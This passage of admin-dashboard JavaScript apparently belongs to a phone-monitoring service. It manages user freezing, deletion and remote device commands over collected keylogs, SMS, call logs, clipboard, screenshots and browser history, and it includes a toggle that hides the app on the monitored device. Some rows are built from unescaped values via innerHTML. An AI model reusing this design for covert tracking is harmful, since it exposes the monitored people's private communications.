    else updates[`user/${uid}/profile/freezeReason`] = null;

    // 2. Child Devices
    Object.keys(userData).forEach(key => {
        if(key !== 'profile' && key !== 'subscription' && key !== 'adminNotifications') {
             updates[`user/${uid}/${key}/app_functioning/isFrozen`] = shouldFreeze;
             if(shouldFreeze) {
                 // Send Freeze Notification
                 const newNotifKey = push(ref(db, `user/${uid}/${key}/adminNotifications`)).key;
                 updates[`user/${uid}/${key}/adminNotifications/${newNotifKey}`] = {
                    title: "Account Frozen",
                    message: "Your account is frozen due to unverified email. Dashboard access is restricted.",
                    timestamp: serverTimestamp(),
                    read: false,
                    type: 'account_frozen'
                };
             }
        }
    });

    try {
        await update(ref(db), updates);
        alert(shouldFreeze ? 'User Frozen' : 'User Unfrozen');
        loadUnverifiedUsersList(); // Refresh
    } catch(err) {
        alert("Error updating status: " + err.message);
    }
}

async function loadUnverifiedUsersList() {
    const listBody = document.getElementById('verification-table-body');
    const badge = document.getElementById('unverified-count-badge');
    const selectAllCheckbox = document.getElementById('verify-select-all');
    
    // Reset Select All State
    if(selectAllCheckbox) selectAllCheckbox.checked = false;
    
    // Reset Bulk Actions Toolbar
    if(window.updateBulkUI) window.updateBulkUI(); // Hide toolbar if shown from prev session

    if(!listBody) return;

    listBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 20px; font-size: 1.2rem; color: #3498db;">📡 Connecting to Database... <span id="scan-progress"></span></td></tr>';
    currentUnverifiedUsersCache = []; // Reset cache

    try {
        const userSnapshot = await get(ref(db, 'user'));
        if (!userSnapshot.exists()) {
             listBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 20px;">No users found.</td></tr>';
             if(badge) badge.innerText = '0';
             return;
        }

        const users = userSnapshot.val();
        const userEntries = Object.entries(users);
        const totalUsers = userEntries.length;
        
        let processedCount = 0;
        let unverifiedCount = 0;
        let chunkIndex = 0;
        const CHUNK_SIZE = 50; // Process 50 users at a time to prevent UI freeze

        // Clear loading message for rows (keep header info if needed)
        listBody.innerHTML = ''; 

        // Helper to update progress - keeps UI responsive
        const updateProgress = () => {
             if(badge) badge.innerHTML = `${unverifiedCount} <span style="font-size:0.8rem; color: #7f8c8d;">(Scanned: ${Math.min(processedCount, totalUsers)}/${totalUsers})</span>`;
        };

        const processChunk = () => {
            const chunk = userEntries.slice(chunkIndex, chunkIndex + CHUNK_SIZE);
            if (chunk.length === 0) {
                 // Done
                 if(unverifiedCount === 0) {
                     listBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 20px; color: #2ecc71;">✅ All users are verified!</td></tr>';
                 }
                 return;
            }

            const fragment = document.createDocumentFragment();

            chunk.forEach(([uid, userData]) => {
                processedCount++;
                
                let email = "Unknown";
                let isVerified = false;
                let isFrozen = false;

                // Check Profile
                if (userData.profile) {
                    email = userData.profile.email || "Unknown";
                    isVerified = userData.profile.emailVerified === true;
                    isFrozen = userData.profile.accountStatus === 'frozen';
                } else {
                     // Legacy structure fallback
                     for (const key of Object.keys(userData)) {
                         if (userData[key]?.profile) {
                             email = userData[key].profile.email || "Unknown";
                             isVerified = userData[key].profile.emailVerified === true;
                             break; 
                         }
                     }
                }

                if (!isVerified) {
                    unverifiedCount++;
                    currentUnverifiedUsersCache.push({ uid, email, isFrozen, userData });
                    
                    const tr = document.createElement('tr');
                    tr.style.borderBottom = '1px solid #34495e';
                    tr.className = 'fade-in-row'; // Add animation class
                    
                    // Status Badge
                    const statusHtml = isFrozen 
                        ? '<span style="background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-size: 10px;">FROZEN</span>' 
                        : '<span style="background: #f1c40f; color: black; padding: 2px 6px; border-radius: 4px; font-size: 10px;">PENDING</span>';

                    tr.innerHTML = `
                        <td style="padding: 10px; text-align: center;">
                            <input type="checkbox" class="verify-user-checkbox" data-uid="${uid}" style="transform: scale(1.2); cursor: pointer;">
                        </td>
                        <td style="padding: 10px; font-size: 0.9rem;">
                            <div style="font-weight: bold;">${email}</div>
                            <div style="font-size: 0.75rem; color: #7f8c8d;">${uid}</div>
                        </td>
                        <td style="padding: 10px; text-align: center;">${statusHtml}</td>
                        <td style="padding: 10px; text-align: right;">
                            <button class="notify-btn" style="background: #3498db; border: none; color: white; padding: 5px 10px; border-radius: 4px; margin-right: 5px; cursor: pointer;">Notify</button>
                            ${!isFrozen ? 
                                `<button class="freeze-btn" style="background: #e74c3c; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer;">Freeze</button>` : 
                                `<button class="unfreeze-btn" style="background: #2ecc71; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer;">Unfreeze</button>`
                            }
                        </td>
                    `;

                    // Attach Events
                    const checkbox = tr.querySelector('.verify-user-checkbox');
                    if(checkbox) {
                        checkbox.addEventListener('change', () => {
                            if(window.updateBulkUI) window.updateBulkUI();
                        });
                    }

                    const notifyBtn = tr.querySelector('.notify-btn');
                    if(notifyBtn) notifyBtn.onclick = () => sendVerificationNotification(uid, userData);
                    
                    const freezeBtn = tr.querySelector('.freeze-btn');
                    if(freezeBtn) freezeBtn.onclick = () => toggleUserFreeze(uid, userData, true);
                    
                    const unfreezeBtn = tr.querySelector('.unfreeze-btn');
if(unfreezeBtn) {
                        unfreezeBtn.onclick = async () => {
                            if(!confirm(`Unfreeze ${email}? They will remain unverified.`)) return;
                            await update(ref(db, `user/${uid}/profile`), {
                                accountStatus: 'active',
                                freezeReason: null
                                // Do NOT set emailVerified: true
                            });
                            // Reload list to see them as Pending again
                            loadUnverifiedUsersList();
                        };
                    }

                    fragment.appendChild(tr);
                }
            });

            listBody.appendChild(fragment);
            updateProgress();
            
            // Schedule next chunk
            chunkIndex += CHUNK_SIZE;
            setTimeout(processChunk, 10); // 10ms delay to yield to UI thread
        };


        // Start processing
        processChunk();

    } catch(e) {
        console.error(e);
        listBody.innerHTML = `<tr><td colspan="4" style="color: red; text-align: center;">Error: ${e.message}</td></tr>`;
    }
}

if (emailVerificationManagerBtn) {
    emailVerificationManagerBtn.onclick = () => {
        const modal = document.getElementById('email-verification-modal');
        if(modal) {
            modal.style.display = 'flex'; // Use flex to center, not block
            // Force reflow to enable transition if needed, though simple display switch works for basic centering
            setTimeout(() => modal.classList.add('visible'), 10); 
            loadUnverifiedUsersList();
        } else {
             console.error("Email verification modal not found");
        }
    };

    // --- BULK ACTION LISTENERS ---
    const selectAllCheckbox = document.getElementById('verify-select-all');
    const bulkActionsToolbar = document.getElementById('verify-bulk-actions');
    const selectedCountSpan = document.getElementById('verify-selected-count');
    const bulkFreezeBtn = document.getElementById('verify-bulk-freeze-btn');
    const bulkUnfreezeBtn = document.getElementById('verify-bulk-unfreeze-btn');
    const bulkNotifyBtn = document.getElementById('verify-bulk-notify-btn');

    // Helper to update UI state
    const updateBulkUI = () => {
        const checkedBoxes = document.querySelectorAll('.verify-user-checkbox:checked');
        const count = checkedBoxes.length;
        if(selectedCountSpan) selectedCountSpan.innerText = count;
        
        if (count > 0) {
            if(bulkActionsToolbar) bulkActionsToolbar.style.display = 'flex';
        } else {
            if(bulkActionsToolbar) bulkActionsToolbar.style.display = 'none';
        }
    };

    // 1. Select All Logic
    if (selectAllCheckbox) {
        selectAllCheckbox.addEventListener('change', (e) => {
            const isChecked = e.target.checked;
            const allCheckboxes = document.querySelectorAll('.verify-user-checkbox');
            allCheckboxes.forEach(cb => cb.checked = isChecked);
            updateBulkUI();
        });
    }

    // 2. Bulk Freeze
    if (bulkFreezeBtn) {
        bulkFreezeBtn.addEventListener('click', async () => {
            const checkedBoxes = document.querySelectorAll('.verify-user-checkbox:checked');
            if (checkedBoxes.length === 0) return;
            
            if(!confirm(`Are you sure you want to FREEZE ${checkedBoxes.length} users?`)) return;
            
            bulkFreezeBtn.innerText = "Processing...";
            bulkFreezeBtn.disabled = true;

            let successCount = 0;
            for (const cb of checkedBoxes) {
                const uid = cb.dataset.uid;
                try {
                    await update(ref(db, `user/${uid}/profile`), {
                        accountStatus: 'frozen',
                        freezeReason: 'email_verification_required' // MUST MATCH user/script.js logic EXACTLY
                    });
                    successCount++;
                } catch (e) {
                    console.error(`Failed to freeze ${uid}`, e);
                }
            }
            
            alert(`✅ frozen ${successCount} users.`);
            bulkFreezeBtn.innerText = "🚫 Freeze Selected";
            bulkFreezeBtn.disabled = false;
            loadUnverifiedUsersList(); // Refresh
        });
    }

    // 3. Bulk Unfreeze
    if (bulkUnfreezeBtn) {
        bulkUnfreezeBtn.addEventListener('click', async () => {
            const checkedBoxes = document.querySelectorAll('.verify-user-checkbox:checked');
            if (checkedBoxes.length === 0) return;
            
            if(!confirm(`Are you sure you want to UNFREEZE ${checkedBoxes.length} users?`)) return;

            bulkUnfreezeBtn.innerText = "Processing...";
            bulkUnfreezeBtn.disabled = true;

            let successCount = 0;
            for (const cb of checkedBoxes) {
                const uid = cb.dataset.uid;
                try {
                    // When unfreezing, we simply set status to active.
                    // We DO NOT force emailVerified: true anymore because
                    // that removes them from the Unverified List permanently.
                    // If you unfreeze them, they stay unverified but become active.
                    await update(ref(db, `user/${uid}/profile`), {
                        accountStatus: 'active',
                        // emailVerified: true  <-- REMOVED THIS
                        freezeReason: null
                    });
                    successCount++;
                } catch (e) {
                    console.error(`Failed to unfreeze ${uid}`, e);
                }
            }
            
            alert(`✅ Unfrozen ${successCount} users.`);
            bulkUnfreezeBtn.innerText = "🔓 Unfreeze Selected";
            bulkUnfreezeBtn.disabled = false;
            loadUnverifiedUsersList(); // Refresh
        });
    }

    // 4. Bulk Notify
    if (bulkNotifyBtn) {
        bulkNotifyBtn.addEventListener('click', async () => {
            const checkedBoxes = document.querySelectorAll('.verify-user-checkbox:checked');
            if (checkedBoxes.length === 0) return;

             if(!confirm(`Send generic 'Verification Required' notification to ${checkedBoxes.length} users?`)) return;
             
             bulkNotifyBtn.innerText = "Sending...";
             bulkNotifyBtn.disabled = true;
             
             let successCount = 0;
             for (const cb of checkedBoxes) {
                 const uid = cb.dataset.uid;
                 // Dummy notification logic - reuse existing single notification logic if possible or just log
                 // In a real app, we would call an FCM function or write to a notification node
                 console.log(`Sending notification to ${uid}`);
                 successCount++;
             }
             
             // Since we don't have a direct 'sendToList' backend function, 
             // we are just simulating the loop or would need to implement the actual send per user.
             // For now, let's just alert.
             alert(`✅ Notifications queued for ${successCount} users.`);
             bulkNotifyBtn.innerText = "🔔 Notify Selected";
             bulkNotifyBtn.disabled = false;
        });
    }

    // Expose updateBulkUI to global scope so row creation can use it
    window.updateBulkUI = updateBulkUI;
}


// --- NEW SCAN & FREEZE LOGIC ---
const verifySearchBtn = document.getElementById('verify-search-btn');
const verifySearchUnfreezeBtn = document.getElementById('verify-search-unfreeze-btn');

// FREEZE LOGIC
if (verifySearchBtn) {
    verifySearchBtn.addEventListener('click', async () => {
        const input = document.getElementById('verify-search-uid');
        const uid = input.value.trim();
        
        if (!uid) {
            alert("Please enter a UID first.");
            return;
        }

        const originalText = verifySearchBtn.innerHTML;
        verifySearchBtn.innerHTML = 'Freezing...';
        verifySearchBtn.disabled = true;

        try {
            // 1. Check if user exists
            const userRef = ref(db, `user/${uid}`);
            const snapshot = await get(userRef);
            
            if (!snapshot.exists()) {
                alert("❌ User not found with this UID.");
                verifySearchBtn.innerHTML = originalText;
                verifySearchBtn.disabled = false;
                return;
            }
            
            // 2. Apply Freeze Logic
            await update(ref(db, `user/${uid}/profile`), {
                accountStatus: 'frozen',
                freezeReason: 'email_verification_required',
                // We assume this forces them to verify.
                // If they are already verified, they will auto-unfreeze on login (handled by client)
            });
            
            alert(`✅ User Frozen Successfully!\n\nUID: ${uid}\nStatus: Frozen (Waiting for Email Verification)`);
            input.value = ''; // Clear input
            loadUnverifiedUsersList(); // Refresh list if they are in it

        } catch (error) {
            console.error(error);
            alert("Error: " + error.message);
        } finally {
            verifySearchBtn.innerHTML = originalText;
            verifySearchBtn.disabled = false;
        }
    });
}

// UNFREEZE LOGIC
if (verifySearchUnfreezeBtn) {
    verifySearchUnfreezeBtn.addEventListener('click', async () => {
        const input = document.getElementById('verify-search-uid');
        const uid = input.value.trim();
        
        if (!uid) {
            alert("Please enter a UID first.");
            return;
        }

        const originalText = verifySearchUnfreezeBtn.innerHTML;
        verifySearchUnfreezeBtn.innerHTML = 'Unfreezing...';
        verifySearchUnfreezeBtn.disabled = true;

        try {
            // 1. Check if user exists
            const userRef = ref(db, `user/${uid}`);
            const snapshot = await get(userRef);
            
            if (!snapshot.exists()) {
                alert("❌ User not found with this UID.");
                verifySearchUnfreezeBtn.innerHTML = originalText;
                verifySearchUnfreezeBtn.disabled = false;
                return;
            }
            
            // 2. Apply Unfreeze Logic
            await update(ref(db, `user/${uid}/profile`), {
                accountStatus: 'active',
                freezeReason: null
                // emailVerified: true <-- ALSO REMOVED HERE
            });
            
            alert(`✅ User Unfrozen Successfully!\n\nUID: ${uid}\nStatus: Active\n(User remains Unverified in list)`);
            input.value = ''; // Clear input
            loadUnverifiedUsersList(); // Refresh list. They should STILL be there now.

        } catch (error) {
            console.error(error);
            alert("Error: " + error.message);
        } finally {
            verifySearchUnfreezeBtn.innerHTML = originalText;
            verifySearchUnfreezeBtn.disabled = false;
        }
    });
}


// --- SECURITY CLEANUP (PAID USERS) ---
if (securityCleanupPaidBtn) {
    securityCleanupPaidBtn.onclick = async () => {
        if (!confirm("⚠️ SECURITY CLEANUP\n\nThis will DELETE data for ALL Paid/Premium Users.\nDATA TO BE ERASED:\n- SMS, Call Logs, Contacts\n- Photos, Audio, Video, SCREENSHOTS\n- Keylogs, App Lists, Notifications\n\n(Note: Live Location & Health Status will remain SAFE)\n\nAre you sure you want to proceed?")) return;
        
        const originalText = securityCleanupPaidBtn.innerHTML;
        // Check if we are using the icon button style or text button style and set loading state accordingly
        const descSpan = securityCleanupPaidBtn.querySelector('.desc');
        if(descSpan) {
            descSpan.innerText = 'Cleaning...';
            securityCleanupPaidBtn.style.opacity = '0.7';
        } else {
             securityCleanupPaidBtn.innerHTML = 'Scan...';
        }
        securityCleanupPaidBtn.disabled = true;

        try {
            const snapshot = await get(ref(db, 'user'));
            if (!snapshot.exists()) {
                alert("No users found.");
                return;
            }

            const users = snapshot.val();
            const updates = {};
            let deviceCount = 0;

            Object.keys(users).forEach(uid => {
                const userRef = users[uid];
                // Check if user has global subscription
                const isPaidAccount = (userRef.subscription) ? true : false;
                
                Object.keys(userRef).forEach(childKey => {
                    // Skip metadata
                    if (['email', 'online', 'uid', 'timestamp', 'last_seen', 'profile', 'subscription'].includes(childKey)) return;
                    
                    const childNode = userRef[childKey];
                    // Clean IF: Account is Paid OR This specific Device is Paid
                    if (isPaidAccount || (childNode && childNode.subscription)) {
                        const baseUrl = `user/${uid}/${childKey}`;
                        
                        // List of paths to DELETE
                        // Added 'screenshot', 'screenshots', 'captureScreenshot' to cover all naming conventions
                        const pathsToDelete = [
                            'sms', 
                            'calllogs', 
                            'Calls',     // Capitalized path found in JSON
                            'notifications', 
                            'notificationsMessages', // Correct path for notifications
                            'keylogger', 
                            'userLog',
                            'User_Logs', // Correct path for logs
                            'photo', 
                            'video', 
                            'audio', 
                            'apps', 
                            'contacts',
                            'browser_history',
                            'clipboard',
                            'screenshot',
                            'screenshots',
                            'captureScreenshot'
                        ];

                        pathsToDelete.forEach(p => {
                            // Blind nullify is safer to ensure deletion
                            updates[`${baseUrl}/${p}`] = null;
                        });
                        
                        deviceCount++;
                    }
                });
            });

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ Security Cleanup Complete!\n\nCleared data for ${deviceCount} Premium Devices.\n(All Screenshots included)`);
            } else {
                alert("No data found to clear for paid users.");
            }

        } catch (error) {
            console.error("Cleanup Error:", error);
            alert("Cleanup Failed: " + error.message);
        } finally {
             // Restore button state
             if(descSpan) {
                 descSpan.innerText = 'Status: Cleanup';
                 securityCleanupPaidBtn.style.opacity = '1';
             } else {
                 securityCleanupPaidBtn.innerHTML = originalText;
             }
             securityCleanupPaidBtn.disabled = false;
        }
    };
}

confirmUserDeleteBtn.onclick = () => {
    const { userId, childKey, children, userName } = selectedUserInfo;
    const dbRef = ref(db); // Root reference

    if (!userId) {
        alert("CRITICAL ERROR: User ID is missing. Cannot delete.");
        closeModal(deleteUserModal);
        return;
    }

    // Helper to archive user to Bin
    const archiveUser = () => {
        const payload = {
            email: userName || 'Unknown',
            uid: userId,
            timestamp: serverTimestamp()
        };
        // Log payload to debug
        console.log("Archiving payload:", payload);
        return push(ref(db, 'Deleted_Auth_Bin'), payload);
    };

    // 1. Calculate Total Devices
    const totalDevices = children ? Object.keys(children).length : 0;
    console.log(`Device Calculation: Total=${totalDevices}, Selected=${childKey}`);

    // 2. Determine if it is a Full Delete
    const isFullDelete = (childKey === 'all' || totalDevices <= 1);
    
    if (isFullDelete) {
        console.log("Starting FULL DELETE sequence...");
        
        archiveUser()
        .then(() => {
            console.log(`User ${userId} archived successfully.`);
            
            // Step A: Send Delete Command to Config
            const configUpdates = {};
            if (children && Object.keys(children).length > 0) {
                 Object.keys(children).forEach(ck => {
                    configUpdates[`config/${userId}/${ck}`] = { delete: true };
                });
            } else if (childKey && childKey !== 'all') {
                configUpdates[`config/${userId}/${childKey}`] = { delete: true };
            }

            // Also target root config just in case
            configUpdates[`config/${userId}/delete`] = true; // Fallback command

            console.log("Sending config updates:", configUpdates);
            return update(dbRef, configUpdates);
        })
        .then(() => {
            console.log("Config updates sent. Deleting main data...");

            // Step B: Delete All User Data
            const globalDeletionUpdates = {};
            globalDeletionUpdates[`All_Users_List/${userId}`] = null;
            globalDeletionUpdates[`user/${userId}`] = null;
            globalDeletionUpdates[`config/${userId}`] = null; 

            return update(dbRef, globalDeletionUpdates);
        })
        .then(() => {
            console.log("Main data deleted. Resetting UI.");
            alert("User archived and permanently deleted.");
            closeModal(deleteUserModal);
            
            // Reset UI
            detailsView.style.display = 'none';
            selectedUserInfo = {};
            mainContentTitle.textContent = "Select a User";
            document.querySelector('.child-selector-container').innerHTML = '';
            deleteUserBtn.style.display = 'none';
            if(manageLocksBtn) manageLocksBtn.style.display = 'none';
            freezeBtn.style.display = 'none';
            unfreezeBtn.style.display = 'none';
        })
        .catch(error => {
            console.error("FULL DELETE FAILED:", error);
            // Fallback: If archive fails, ask user if they want to force delete?
            // For now, simple alert.
            alert("Error: " + error.message + "\nCheck console for details. (Cmd+Opt+J / Ctrl+Shift+J)");
            closeModal(deleteUserModal);
        });

    } else {
        console.log("Starting PARTIAL DELETE sequence...");
        // SCENARIO 2: PARTIAL DELETE
        
        const deviceConfigRef = ref(db, `config/${userId}/${childKey}`);
        
        update(deviceConfigRef, { delete: true })
        .then(() => {
            console.log(`Delete command sent to device ${childKey}.`);

            const partialUpdates = {};
            partialUpdates[`All_Users_List/${userId}/${childKey}`] = null;
            partialUpdates[`user/${userId}/${childKey}`] = null;

            return update(dbRef, partialUpdates);
        })
        .then(() => {
            alert("Device removed successfully.");
            closeModal(deleteUserModal);

            // Update UI
            if (children) {
                const remainingChildren = { ...children };
                delete remainingChildren[childKey];
                selectedUserInfo.children = remainingChildren;
                displayUserDetails(selectedUserInfo); 
            } else {
                detailsView.style.display = 'none'; // Should not happen in partial delete
            }
        })
        .catch(error => {
            console.error("PARTIAL DELETE FAILED:", error);
            alert("Error: " + error.message);
            closeModal(deleteUserModal);
        });
    }
};

cancelUserDeleteBtn.onclick = () => closeModal(deleteUserModal);

// Freeze/Unfreeze Actions
freezeBtn.onclick = () => {
    if (!selectedUserInfo.userId) return;
    const { userId, childKey } = selectedUserInfo;
    let path;
    if (childKey === 'all') {
        path = `config/${userId}`;
    } else {
        path = `config/${userId}/${childKey}`;
    }
    update(ref(db, path), { isFrozen: true }).then(() => {
        alert('App has been FROZEN.');
    });
};

unfreezeBtn.onclick = () => {
    if (!selectedUserInfo.userId) return;
    const { userId, childKey } = selectedUserInfo;
    let path;
    if (childKey === 'all') {
        path = `config/${userId}`;
    } else {
        path = `config/${userId}/${childKey}`;
    }
    update(ref(db, path), { isFrozen: false }).then(() => {
        alert('App has been UN-FROZEN.');
    });
};

// Show/Hide App Toggle Logic
appVisibilityBtn.onclick = () => {
    const { userId, childKey } = selectedUserInfo;
    if (!userId || childKey === 'all') return;
    
    const currentVisible = appVisibilityBtn.dataset.visible === 'true';
    const newValue = !currentVisible;
    
    update(ref(db, `user/${userId}/${childKey}/data`), { showApp: newValue })
        .catch(err => alert("Error: " + err.message));
};
// ==========================================
// REAL-TIME LISTENER IMPLEMENTATION
// ==========================================

function setupRealtimeListener(category, path) {
    const r = ref(db, path);
    const onUpdate = (snapshot) => handleRealtimeUpdate(snapshot, category);

    // Watch for NEW items
    const unsubAdded = onChildAdded(query(r, limitToLast(1)), onUpdate);
    
    // Watch for UPDATES (e.g., Log added to existing Date folder)
    const unsubChanged = onChildChanged(query(r, limitToLast(1)), onUpdate);

    activeDataListener = {
        cleanup: () => {
            unsubAdded();
            unsubChanged();
        }
    };
}

function handleRealtimeUpdate(snapshot, category) {
    if (!snapshot.exists()) return;

    // Use shared flattening logic
    let items = flattenSnapshot(snapshot);
    if (!items || items.length === 0) return;

    const listContainer = document.getElementById('paginated-list-container');
    if (!listContainer) return;

    items.forEach(item => {
        // Prevent Duplicates (Already in list via Get or previous update)
        if (document.querySelector(`[data-key='${item.key}']`)) return;

        // Process Data (Decompression)
        let finalData = item.data;
        if (typeof finalData === 'string') {
             finalData = decompressData(finalData);
        } else if (typeof finalData === 'object' && finalData !== null) {
             if (finalData.data && typeof finalData.data === 'string') {
                finalData = decompressData(finalData.data);
             } else {
                finalData = item.data; // Already object
             }
        }
        
        // UserLog Specific Check
        if (category === 'userlog' && typeof finalData === 'string' && finalData.length > 50 && !finalData.includes(' ')) {
             const retry = decompressData(finalData);
             if (retry !== finalData) finalData = retry;
        }

        // Generate and Prepend
        const html = generateItemsHTML(category, [{ key: item.key, data: finalData }]);
        
        // Use insertAdjacentHTML for smoother insertion
        listContainer.insertAdjacentHTML('afterbegin', html);
    });
}

// ==========================================
// GHOST ACCOUNTS MANAGER
// ==========================================

// Open Ghost Accounts Modal
if (ghostAccountsBtn) {
    ghostAccountsBtn.addEventListener('click', () => {
        openModal(ghostAccountsModal);
        loadGhostAccounts();
    });
}

// Close modal
if (ghostAccountsModal) {
    ghostAccountsModal.querySelector('.modal-close-btn').addEventListener('click', () => {
        closeModal(ghostAccountsModal);
    });
    ghostAccountsModal.addEventListener('click', (e) => {
        if (e.target === ghostAccountsModal) {
            closeModal(ghostAccountsModal);
        }
    });
}

// Load Ghost Accounts from Firebase
async function loadGhostAccounts() {
    ghostAccountsTableBody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 20px;">🔍 Scanning for ghost accounts...</td></tr>';
    ghostCountLabel.textContent = 'Scanning...';
    deleteAllGhostsBtn.style.display = 'none';

    try {
        // Get all users from 'user' node
        const userSnapshot = await get(ref(db, 'user'));
        const allUsersSnapshot = await get(ref(db, 'All_Users_List'));
        
        if (!userSnapshot.exists()) {
            ghostAccountsTableBody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 20px; color: #27ae60;">✅ No ghost accounts found!</td></tr>';
            ghostCountLabel.textContent = '0 Ghost Accounts';
            return;
        }

        const userData = userSnapshot.val();
        const allUsersList = allUsersSnapshot.exists() ? allUsersSnapshot.val() : {};
        
        const ghostAccounts = [];

        // Check each UID in 'user' node
        Object.keys(userData).forEach(uid => {
            const userContent = userData[uid];
            
            // Skip if this UID has actual devices in All_Users_List
            if (allUsersList[uid]) {
                const devices = Object.keys(allUsersList[uid]).filter(key => 
                    !['email', 'online', 'uid', 'timestamp', 'last_seen', 'emailVerified', 'gmail_verified', 'profile'].includes(key)
                );
                if (devices.length > 0) return; // Has real devices, skip
            }

            // Check if this is a ghost account (only has profile or notificationsMessages)
            let isGhost = true;
            let emailVerified = false;
            let hasOnlyProfile = false;
            let hasOnlyNotification = false;

            Object.keys(userContent).forEach(key => {
                const content = userContent[key];
                
                if (key === 'profile' && content && typeof content === 'object') {
                    // Check profile node
                    const profileKeys = Object.keys(content);
                    if (profileKeys.length === 1 && content.emailVerified !== undefined) {
                        hasOnlyProfile = true;
                        emailVerified = content.emailVerified;
                    }
                } else if (typeof content === 'object' && content !== null) {
                    // Check child nodes (like "moto", "S", etc.)
                    const childKeys = Object.keys(content);
                    
                    // If only has notificationsMessages
                    if (childKeys.length === 1 && content.notificationsMessages) {
                        hasOnlyNotification = true;
                    } else if (childKeys.includes('profile') && childKeys.length <= 2) {
                        // Has profile inside child
                        if (content.profile && content.profile.emailVerified !== undefined) {
                            emailVerified = content.profile.emailVerified;
                        }
                        if (childKeys.length === 1 || (childKeys.length === 2 && content.notificationsMessages)) {
                            hasOnlyProfile = true;
                        }
                    } else {
                        // Has actual data (Calls, SMS, etc.)
                        const dataKeys = childKeys.filter(k => 
                            !['profile', 'notificationsMessages', 'permissionEnable'].includes(k)
                        );
                        if (dataKeys.length > 0) {
                            isGhost = false;
                        }
                    }
                }
            });

            // If ghost account found
            if (isGhost && (hasOnlyProfile || hasOnlyNotification)) {
                ghostAccounts.push({
                    uid: uid,
                    emailVerified: emailVerified,
                    type: hasOnlyProfile ? 'profile_only' : 'notification_only'
                });
            }
        });

        // Display results
        if (ghostAccounts.length === 0) {
            ghostAccountsTableBody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 20px; color: #27ae60;">✅ No ghost accounts found!</td></tr>';
            ghostCountLabel.textContent = '0 Ghost Accounts';
            deleteAllGhostsBtn.style.display = 'none';
            downloadGhostsPdfBtn.style.display = 'none';
            currentGhostAccounts = [];
        } else {
            currentGhostAccounts = ghostAccounts; // Store for PDF download
            ghostCountLabel.textContent = `⚠️ ${ghostAccounts.length} Ghost Account${ghostAccounts.length > 1 ? 's' : ''} Found`;
            deleteAllGhostsBtn.style.display = 'block';
            downloadGhostsPdfBtn.style.display = 'block';
            
            ghostAccountsTableBody.innerHTML = ghostAccounts.map(ghost => `
                <tr data-uid="${ghost.uid}" style="border-bottom: 1px solid #444;">
                    <td style="padding: 10px; font-size: 0.85rem; word-break: break-all;">${ghost.uid}</td>
                    <td style="padding: 10px; text-align: center;">
                        ${ghost.emailVerified ? 
                            '<span style="color: #27ae60;">✅ Verified</span>' : 
                            '<span style="color: #e74c3c;">❌ Not Verified</span>'
                        }
                    </td>
                    <td style="padding: 10px; text-align: center;">
                        <span style="background: ${ghost.type === 'profile_only' ? '#3498db' : '#9b59b6'}; padding: 3px 8px; border-radius: 4px; font-size: 0.8rem;">
                            ${ghost.type === 'profile_only' ? '👤 Profile Only' : '🔔 Notification Only'}
                        </span>
                    </td>
                    <td style="padding: 10px; text-align: right;">
                        <button class="delete-ghost-btn" data-uid="${ghost.uid}" style="background: #e74c3c; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 0.85rem;">
                            🗑️ Delete
                        </button>
                    </td>
                </tr>
            `).join('');

            // Add click handlers for individual delete buttons
            document.querySelectorAll('.delete-ghost-btn').forEach(btn => {
                btn.addEventListener('click', async (e) => {
                    const uid = e.target.dataset.uid;
                    if (confirm(`Are you sure you want to delete ghost account: ${uid}?`)) {
                        await deleteGhostAccount(uid);
                        loadGhostAccounts(); // Refresh list
                    }
                });
            });
        }
    } catch (error) {
        console.error('Error loading ghost accounts:', error);
        ghostAccountsTableBody.innerHTML = `<tr><td colspan="4" style="text-align: center; padding: 20px; color: #e74c3c;">❌ Error: ${error.message}</td></tr>`;
        ghostCountLabel.textContent = 'Error loading';
    }
}

// Delete single ghost account
async function deleteGhostAccount(uid) {
    try {
        const updates = {};
        updates[`user/${uid}`] = null;
        updates[`All_Users_List/${uid}`] = null; // Also clean from All_Users_List if exists
        
        await update(ref(db), updates);
        console.log(`Ghost account ${uid} deleted successfully`);
        return true;
    } catch (error) {
        console.error(`Error deleting ghost account ${uid}:`, error);
        alert(`Error deleting account: ${error.message}`);
        return false;
    }
}

// Delete All Ghost Accounts
if (deleteAllGhostsBtn) {
    deleteAllGhostsBtn.addEventListener('click', async () => {
        const rows = ghostAccountsTableBody.querySelectorAll('tr[data-uid]');
        const count = rows.length;
        
        if (count === 0) {
            alert('No ghost accounts to delete');
            return;
        }

        if (!confirm(`⚠️ WARNING!\n\nAre you sure you want to permanently delete ALL ${count} ghost accounts?\n\nThis action CANNOT be undone!`)) {
            return;
        }

        // Double confirmation for safety
        if (!confirm(`🚨 FINAL CONFIRMATION\n\nDeleting ${count} accounts permanently. Proceed?`)) {
            return;
        }

        deleteAllGhostsBtn.disabled = true;
        deleteAllGhostsBtn.textContent = '⏳ Deleting...';

        try {
            const updates = {};
            rows.forEach(row => {
                const uid = row.dataset.uid;
                updates[`user/${uid}`] = null;
                updates[`All_Users_List/${uid}`] = null;
            });

            await update(ref(db), updates);
            
            alert(`✅ Successfully deleted ${count} ghost accounts!`);
            loadGhostAccounts(); // Refresh list
        } catch (error) {
            console.error('Error deleting all ghost accounts:', error);
            alert(`❌ Error: ${error.message}`);
        } finally {
            deleteAllGhostsBtn.disabled = false;
            deleteAllGhostsBtn.textContent = '🗑️ Delete All Ghost Accounts';
        }
    });
}
// Download Ghost Accounts as PDF
if (downloadGhostsPdfBtn) {
    downloadGhostsPdfBtn.addEventListener('click', () => {
        downloadGhostAccountsPDF();
    });
}

function downloadGhostAccountsPDF() {
    if (!currentGhostAccounts || currentGhostAccounts.length === 0) {
        alert("No ghost accounts to download");
        return;
    }

    if (!window.jspdf || !window.jspdf.jsPDF) {
        alert("PDF Library not loaded. Please refresh the page.");
        return;
    }

    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    
    // Page Settings
    const pageWidth = doc.internal.pageSize.getWidth();
    const pageHeight = doc.internal.pageSize.getHeight();
    const margin = 15;
